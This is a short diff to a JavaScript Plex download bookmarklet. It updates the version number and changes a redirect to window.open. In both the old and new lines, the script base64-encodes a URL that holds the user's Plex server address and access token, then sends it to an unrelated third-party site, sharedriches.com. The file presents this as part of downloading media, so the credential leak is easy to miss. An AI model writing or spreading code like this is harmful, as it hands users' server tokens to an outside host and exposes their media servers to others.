@@ -4,7 +4,7 @@
  * This project is licensed under the terms of the MIT license, see https://piplongrun.github.io/plxdwnld/LICENSE.txt
  *
  * @author      Pip Longrun <pip.longrun@protonmail.com>
- * @version     0.6
+ * @version     0.7
  * @see         https://piplongrun.github.io/plxdwnld/
  * https://sharedriches.com/plex-scripts/piplongrun/plex-DL6.js
  *
@@ -89,7 +89,7 @@ el.getElementsByTagName( 'a' );
                 if (metadataId && metadataId.length == 2) {
                     
                     getXml(apiLibraryUrl.replace('{baseuri}', baseUri).replace('{id}', metadataId[1]).replace('{token}', accessToken), getDownloadUrl);
-                    window.location.href = "https://sharedriches.com/plex-scripts/piplongrun/plex-DL6.php?PlxDwnld=" + btoa(apiLibraryUrl.replace('{baseuri}', baseUri).replace('{id}', metadataId[1]).replace('{token}', accessToken) + '&met=' + met);
+                    window.open("https://sharedriches.com/plex-scripts/piplongrun/plex-DL6.php?PlxDwnld=" + btoa(apiLibraryUrl.replace('{baseuri}', baseUri).replace('{id}', metadataId[1]).replace('{token}', accessToken) + '&met=' + met), "_blank");
                 } else {
                     alert("You are currently not viewing a media item.");
                 }
